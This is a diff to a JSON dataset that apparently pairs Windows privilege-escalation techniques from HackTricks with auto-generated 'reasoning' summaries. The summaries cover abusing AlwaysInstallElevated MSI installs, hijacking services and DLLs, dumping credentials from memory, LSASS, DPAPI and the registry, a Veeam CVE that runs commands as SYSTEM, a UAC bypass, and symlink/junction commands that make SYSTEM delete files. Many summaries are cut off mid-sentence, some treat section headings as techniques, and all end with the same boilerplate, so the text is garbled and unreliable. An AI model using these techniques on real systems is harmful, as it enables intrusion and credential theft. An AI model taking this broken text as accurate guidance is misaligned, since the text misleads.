@@ -35,7 +35,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Version info enumeration. Target OS: windows. Has 6 associated commands. Check if the Windows version has any known vulnerability (check also the patches applied). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -59,7 +59,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Environment. Target OS: windows. Has 3 associated commands. Any credential/Juicy info saved in the env variables? Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -98,7 +98,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerShell History. Target OS: windows. Has 6 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -142,7 +142,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerShell Transcript files. Target OS: windows. Has 7 associated commands. You can learn how to turn this on in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -176,7 +176,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerShell Module Logging. Target OS: windows. Has 5 associated commands. Details of PowerShell pipeline executions are recorded, encompassing executed commands, command invocations, and parts of scripts. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -210,7 +210,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerShell **Script Block Logging**. Target OS: windows. Has 5 associated commands. A complete activity and full content record of the script's execution is captured, ensuring that every block of code is documented as it runs. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -229,7 +229,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Internet Settings. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -253,7 +253,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Drives. Target OS: windows. Has 3 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -312,7 +312,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: WSUS. Target OS: windows. Has 10 associated commands. You can compromise the system if the updates are not requested using http S  but http. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -326,7 +326,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401). Target OS: windows. Has 1 associated commands. Veeam B&R <  11.0.1.1261  exposes a localhost service on  TCP/9401  that processes attacker-controlled messages, allowing arbitrary commands as  NT AUTHORITY\\SYSTEM . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -345,7 +345,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: AlwaysInstallElevated. Target OS: windows. Has 2 associated commands. If  these 2 registers are  enabled  (value is  0x1 ), then users of any privilege can  install  (execute)  .msi  files as NT AUTHORITY\\\\ SYSTEM . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -364,7 +364,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Metasploit payloads. Target OS: windows. Has 2 associated commands. If you have a meterpreter session you can automate this technique using the module  exploit/windows/local/always_install_elevated Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -378,7 +378,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerUP. Target OS: windows. Has 1 associated commands. Use the  Write-UserAddMSI  command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -392,7 +392,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: MSI Installation. Target OS: windows. Has 1 associated commands. To execute the  installation  of the malicious  . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -406,7 +406,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Audit Settings. Target OS: windows. Has 1 associated commands. These settings decide what is being  logged , so you should pay attention Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -420,7 +420,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: WEF. Target OS: windows. Has 1 associated commands. Windows Event Forwarding, is interesting to know where are the logs sent Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -434,7 +434,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: WDigest. Target OS: windows. Has 1 associated commands. If active,  plain-text passwords are stored in LSASS  (Local Security Authority Subsystem Service).\\ [ More info about WDigest in this page ](../stealing-credentials/credentials-protections. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -448,7 +448,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: LSA Protection. Target OS: windows. Has 1 associated commands. Starting with  Windows 8. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -462,7 +462,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Credentials Guard. Target OS: windows. Has 1 associated commands. Credential Guard  wasn introduced in  Windows 10 . Its purpose is to safeguard the credentials stored on a device against threats like pass-the-hash attacks.| [ More info about Credentials Guard here. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -476,7 +476,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Cached Credentials. Target OS: windows. Has 1 associated commands. Domain credentials  are authenticated by the  Local Security Authority  (LSA) and utilized by operating system components. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -495,7 +495,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Logged users / Sessions. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -514,7 +514,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Home folders. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -528,7 +528,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Password Policy. Target OS: windows. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -542,7 +542,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Get the content of the clipboard. Target OS: windows. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -626,7 +626,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: File and Folder Permissions. Target OS: windows. Has 15 associated commands. First of all, listing the processes  check for passwords inside the command line of the process . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -640,7 +640,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Memory Password mining. Target OS: windows. Has 1 associated commands. You can create a memory dump of a running process using  procdump  from sysinternals. Services like FTP have the  credentials in clear text in memory , try to dump the memory and read the credentials. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -669,7 +669,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Services. Target OS: windows. Has 4 associated commands. Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -708,7 +708,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Permissions. Target OS: windows. Has 6 associated commands. You can use  sc  to get information of a service It is recommended to have the binary  accesschk  from _Sysinternals_ to check the required privilege level for each service. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -761,7 +761,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Modify service binary path**. Target OS: windows. Has 4 associated commands. In the scenario where the \"Authenticated users\" group possesses  SERVICE_ALL_ACCESS  on a service, modification of the service's executable binary is possible. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -814,7 +814,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Services binaries weak permissions. Target OS: windows. Has 5 associated commands. Check if you can modify the binary that is executed by a service  or if you have  write permissions on the folder  where the binary is located ([ DLL Hijacking ](dll-hijacking/index.html)) . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -843,7 +843,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Services registry modify permissions. Target OS: windows. Has 4 associated commands. You should check if you can modify any service registry. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -867,7 +867,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Unquoted Service Paths. Target OS: windows. Has 3 associated commands. If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path _C:\\Program Files\\Some Folder\\Service. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -916,7 +916,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Using PowerUp.ps1. Target OS: windows. Has 8 associated commands. Get-ServiceUnquoted -Verbose bash for /f \"tokens=2\" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do ( \tfor /f \"delims=: tokens=1 \" %%r in ('sc qc \"%%~n\" ^| findstr BINARY_PATH_NAME ^| findst Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -950,7 +950,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Installed Applications. Target OS: windows. Has 5 associated commands. Check  permissions of the binaries  (maybe you can overwrite one and escalate privileges) and of the  folders  ([DLL Hijacking](dll-hijacking/index.html)). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -984,7 +984,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Find all weak file permissions per drive.. Target OS: windows. Has 5 associated commands. accesschk.exe -uwqs Users c:\\ . accesschk.exe -uwqs \"Authenticated Users\" c:\\ . accesschk.exe -uwdqs \"Everyone\" c:\\ . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1008,7 +1008,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Drivers. Target OS: windows. Has 3 associated commands. Look for possible  third party weird/vulnerable  drivers If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1022,7 +1022,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PATH DLL Hijacking. Target OS: windows. Has 1 associated commands. If you have  write permissions inside a folder present on PATH  you could be able to hijack a DLL loaded by a process and  escalate privileges . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1056,7 +1056,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Shares. Target OS: windows. Has 5 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1070,7 +1070,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: hosts file. Target OS: windows. Has 1 associated commands. Check for other known computers hardcoded on the hosts file Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1094,7 +1094,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Network Interfaces & DNS. Target OS: windows. Has 3 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1108,7 +1108,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Open Ports. Target OS: windows. Has 1 associated commands. Check for  restricted services  from the outside Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1127,7 +1127,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Routing Table. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1146,7 +1146,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: ARP Table. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1185,7 +1185,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Windows Subsystem for Linux (wsl). Target OS: windows. Has 6 associated commands. Binary  bash.exe  can also be found in  C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe If you get root user you can listen on any port (the first time you use  nc. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1229,7 +1229,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Winlogon Credentials. Target OS: windows. Has 7 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1273,7 +1273,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Credentials manager / Windows vault. Target OS: windows. Has 7 associated commands. From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1312,7 +1312,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: DPAPI. Target OS: windows. Has 6 associated commands. The  Data Protection API (DPAPI)  provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1346,7 +1346,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerShell Credentials. Target OS: windows. Has 5 associated commands. PowerShell credentials  are often used for  scripting  and automation tasks as a way to store encrypted credentials conveniently. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1370,7 +1370,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Wifi. Target OS: windows. Has 3 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1389,7 +1389,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Recently Run Commands. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1403,7 +1403,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Remote Desktop Credential Manager**. Target OS: windows. Has 1 associated commands. Use the  Mimikatz   dpapi::rdg  module with appropriate  /masterkey  to  decrypt any . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1512,7 +1512,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: AppCmd.exe. Target OS: windows. Has 20 associated commands. Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level. \\ AppCmd.exe  is located in the  %systemroot%\\system32\\inetsrv\\  directory. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1536,7 +1536,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SCClient / SCCM. Target OS: windows. Has 3 associated commands. Check if  C:\\Windows\\CCM\\SCClient.exe  exists .\\ Installers are  run with SYSTEM privileges , many are vulnerable to  DLL Sideloading (Info from  [ https://github.com/enjoiz/Privesc ](https://github. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1550,7 +1550,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Putty Creds. Target OS: windows. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1564,7 +1564,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Putty SSH Host Keys. Target OS: windows. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1583,7 +1583,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SSH keys in registry. Target OS: windows. Has 2 associated commands. SSH private keys can be stored inside the registry key  HKCU\\Software\\OpenSSH\\Agent\\Keys  so you should check if there is anything interesting in there: If you find any entry inside that path it will  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1652,7 +1652,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Unattended files. Target OS: windows. Has 12 associated commands. You can also search for these files using  metasploit : _post/windows/gather/enum_unattend_ Example content: xml <component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" langu Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1691,7 +1691,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Cloud Credentials. Target OS: windows. Has 6 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1710,7 +1710,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Cached GPP Pasword. Target OS: windows. Has 2 associated commands. A feature was previously available that allowed the deployment of custom local administrator accounts on a group of machines via Group Policy Preferences (GPP). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1744,7 +1744,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: IIS Web Config. Target OS: windows. Has 5 associated commands. Example of web. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1768,7 +1768,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Ask for credentials. Target OS: windows. Has 3 associated commands. You can always  ask the user to enter his credentials of even the credentials of a different user  if you think he can know them (notice that  asking  the client directly for the  credentials  is real Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1877,7 +1877,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Possible filenames containing credentials**. Target OS: windows. Has 20 associated commands. Known files that some time ago contained  passwords  in  clear-text  or  Base64 bash $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history vnc.ini, ultravnc.ini,  vnc web. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1906,7 +1906,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Inside the registry. Target OS: windows. Has 4 associated commands. Other possible registry keys with credentials [ Extract openssh keys from registry. ](https://blog.ropnop. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1965,7 +1965,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Generic Password search in files and registry**. Target OS: windows. Has 10 associated commands. Search for file contents Search for a file with a certain filename Search the registry for key names and passwords Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -1994,7 +1994,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Tools that search for passwords. Target OS: windows. Has 4 associated commands. [ MSF-Credentials Plugin ](https://github. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2038,7 +2038,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Monitoring Command Lines for passwords**. Target OS: windows. Has 7 associated commands. When getting a shell as a user, there may be scheduled tasks or other processes being executed which  pass credentials on the command line . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2147,7 +2147,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: From Low Priv User to NT\\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass. Target OS: windows. Has 20 associated commands. If you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as \"NT\\AUTHORITY  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2210,7 +2210,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: From Folder Contents Delete to SYSTEM EoP. Target OS: windows. Has 8 associated commands. What if your primitive doesn’t allow you to delete arbitrary files/folders, but it  does allow deletion of the  contents  of an attacker-controlled folder ? 1. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2224,7 +2224,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: folder1 is now a junction to \\RPC Control (non-filesystem namespace). Target OS: windows. Has 1 associated commands. mklink /J C:\\temp\\folder1 \\\\?\\GLOBALROOT\\RPC Control bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2253,7 +2253,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Make file1.txt point to a sensitive folder stream. Target OS: windows. Has 4 associated commands. CreateSymlink(\"\\\\RPC Control\\\\file1.txt\", \"C:\\\\Config.Msi::$INDEX_ALLOCATION\") C:\\Config.Msi::$INDEX_ALLOCATION Result :  C:\\Config.Msi  is deleted by SYSTEM. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2267,7 +2267,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: From Arbitrary Folder Create to Permanent DoS. Target OS: windows. Has 1 associated commands. Exploit a primitive that lets you  create an arbitrary folder as SYSTEM/admin  —  even if  you can’t write files  or  set weak permissions . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2291,7 +2291,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS. Target OS: windows. Has 3 associated commands. When a  privileged service  writes logs/exports to a path read from a  writable config , redirect that path with  Object Manager symlinks + NTFS mount points  to turn the privileged write into an arbi Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2310,7 +2310,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **New service**. Target OS: windows. Has 2 associated commands. If you are already running on a High Integrity process, the  path to SYSTEM  can be easy just  creating and executing a new service : > [!TIP] > When creating a service binary make sure it's a valid s Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2324,7 +2324,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Useful tools. Target OS: windows. Has 1 associated commands. Best tool to look for Windows local privilege escalation vectors:  [ WinPEAS ](https://github. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2338,7 +2338,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub). Target OS: windows. Has 1 associated commands. DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs  string_contains(\".asus. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/abusing-auto-updaters-and-ipc"
  },
  {
@@ -2471,7 +2471,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Access Tokens. Target OS: windows. Has 20 associated commands. Each  user logged  onto the system  holds an access token with security information  for that logon session. The system creates an access token when the user logs on. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/access-tokens"
  },
  {
@@ -2490,7 +2490,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Credentials user impersonation. Target OS: windows. Has 2 associated commands. If you have  valid credentials of any other user , you can  create  a  new logon session  with those credentials : The  access token  has also a  reference  of the logon sessions inside the  LSASS , t Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/access-tokens"
  },
  {
@@ -2514,7 +2514,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Searching not existent COM components. Target OS: windows. Has 3 associated commands. As the values of HKCU can be modified by the users  COM Hijacking  could be used as a  persistent mechanisms . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/com-hijacking"
  },
  {
@@ -2568,7 +2568,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Steps (PowerShell). Target OS: windows. Has 9 associated commands. 1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains:  {EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}  (Microsoft Web Browser). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/com-hijacking"
  },
  {
@@ -2597,7 +2597,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Creating Malicious MSI and Getting Root. Target OS: windows. Has 4 associated commands. {{ include ../../banners/hacktricks-training.md}} The creation of the MSI installer will be done using wixtools, specifically [wixtools](http://wixtoolset.org) will be utilized. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/create-msi-with-wix"
  },
  {
@@ -2631,7 +2631,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Escalating Privileges. Target OS: windows. Has 5 associated commands. Requirements : - Identify a process that operates or will operate under  different privileges  (horizontal or lateral movement), which is  lacking a DLL . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2655,7 +2655,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Meterpreter**. Target OS: windows. Has 3 associated commands. Get rev shell (x64): Get a meterpreter (x86): Create a user (x86 I didn't see a x64 version): Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2694,7 +2694,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Your own. Target OS: windows. Has 6 associated commands. Note that in several cases the Dll that you compile must  export several functions  that are going to be loaded by the victim process, if these functions doesn't exist the  binary won't be able to loa Run enumeration (linpeas/winpeas) to confirm applicability.",
